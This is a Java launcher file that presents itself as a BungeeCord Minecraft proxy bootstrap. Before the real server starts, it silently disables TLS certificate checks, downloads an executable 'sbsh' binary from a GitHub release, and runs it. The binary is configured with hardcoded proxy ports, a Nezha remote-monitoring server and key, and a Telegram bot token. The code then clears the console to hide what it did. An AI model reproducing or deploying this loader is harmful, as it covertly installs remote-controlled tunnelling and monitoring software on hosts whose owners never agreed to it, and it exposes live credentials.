package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import javax.net.ssl.*;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT","FILE_PATH","UUID","NEZHA_SERVER","NEZHA_PORT",
        "NEZHA_KEY","ARGO_PORT","ARGO_DOMAIN","ARGO_AUTH",
        "HY2_PORT","TUIC_PORT","REALITY_PORT","CFIP","CFPORT",
        "UPLOAD_URL","CHAT_ID","BOT_TOKEN","NAME"
    };

    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
            Thread.sleep(2000);
            System.exit(1);
        }

        try {
            runSbxBinary();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        BungeeCordLauncher.main(args);
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception ignored) {}
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
        envVars.put("NEZHA_PORT", "443");
        envVars.put("NEZHA_KEY", "4ye75OmhG2duIQbc50");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "20076");
        envVars.put("S5_PORT", "20129");
        envVars.put("TUIC_PORT", "20297");
        envVars.put("REALITY_PORT", "20489");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "7592034407");
        envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
        envVars.put("CFIP", "104.17.97.5");
        envVars.put("CFPORT", "2096");
        envVars.put("NAME", "greathost");
        envVars.put("DISABLE_ARGO", "true");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;

                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();

                String[] parts = line.split("=", 2);
                if (parts.length == 2 && Arrays.asList(ALL_ENV_VARS).contains(parts[0].trim())) {
                    envVars.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", ""));
                }
            }
        }
    }

    private static Path getBinaryPath() throws Exception {
        disableSSLVerification();

        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://github.com/pingmike2/NanoLimbo/releases/download/amd64/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://github.com/pingmike2/NanoLimbo/releases/download/arm64/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://github.com/pingmike2/NanoLimbo/releases/download/s390x/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            downloadWithRedirect(url, path);
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void downloadWithRedirect(String urlStr, Path out) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn;
        int redirects = 0;

        while (true) {
            conn = (HttpURLConnection) url.openConnection();
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.connect();

            int code = conn.getResponseCode();
            if (code >= 300 && code < 400) {
                String loc = conn.getHeaderField("Location");
                url = new URL(loc);
                redirects++;
                if (redirects > 5) throw new IOException("Too many redirects");
                continue;
            }

            try (InputStream in = conn.getInputStream()) {
                Files.copy(in, out, StandardCopyOption.REPLACE_EXISTING);
            }
            break;
        }
    }

    private static void disableSSLVerification() throws Exception {
        TrustManager[] trustAll = new TrustManager[]{ new X509TrustManager() {
            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
            public void checkClientTrusted(X509Certificate[] c, String a) {}
            public void checkServerTrusted(X509Certificate[] c, String a) {}
        }};
        SSLContext sc = SSLContext.getInstance("TLS");
        sc.init(null, trustAll, new SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        HttpsURLConnection.setDefaultHostnameVerifier((h,s)->true);
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}